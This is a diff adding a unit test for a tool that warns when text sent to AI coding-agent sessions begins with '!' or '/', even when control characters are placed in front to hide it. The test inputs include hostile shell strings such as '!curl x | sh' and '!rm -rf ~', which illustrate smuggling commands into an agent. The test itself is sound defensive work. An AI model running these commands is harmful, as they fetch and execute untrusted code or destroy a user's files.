@@ -76,6 +76,20 @@ describe("a card shows what it types or publishes whole", () => {
     expect(plain.danger).toBeUndefined();
   });
 
+  it("a leading “!” or “/” is warned of as the text is typed: control characters before it, which pasting strips, don't hide it", async () => {
+    const mac = fakeMac();
+    mac.own.push(info("a1", { title: "api" }));
+    const shell = "It starts with “!”: Claude may run it as a shell command rather than read it";
+    const slash = "It starts with “/”: Claude may run it as a slash command rather than read it";
+    for (const text of ["\x01!curl x | sh", "\x1b\x7f\x9b !curl x | sh", "\r\n\x00!rm -rf ~"]) {
+      expect((await mac.tool("send_to_session").card!({ session: "a1", text })).warnings, JSON.stringify(text)).toEqual([shell]);
+      expect((await mac.tool("start_session").card!({ agent: "claude", prompt: text })).warnings, JSON.stringify(text)).toEqual([shell]);
+    }
+    expect((await mac.tool("broadcast").card!({ group: "atticus", text: "\x02/clear" })).warnings).toEqual(["It starts with “/”: their agents may run it as a slash command rather than read it"]);
+    expect((await mac.tool("send_to_session").card!({ session: "a1", text: "\x05/clear" })).warnings).toEqual([slash]);
+    expect((await mac.tool("send_to_session").card!({ session: "a1", text: "\x01say !hi" })).warnings).toEqual([]);
+  });
+
   it("broadcast: the text whole, who gets it by id, and each recipient in a wider mode warned of", async () => {
     const mac = fakeMac();
     mac.own.push(info("a1", { title: "api" }), info("b1", { title: "web", permissionMode: "acceptEdits" }));
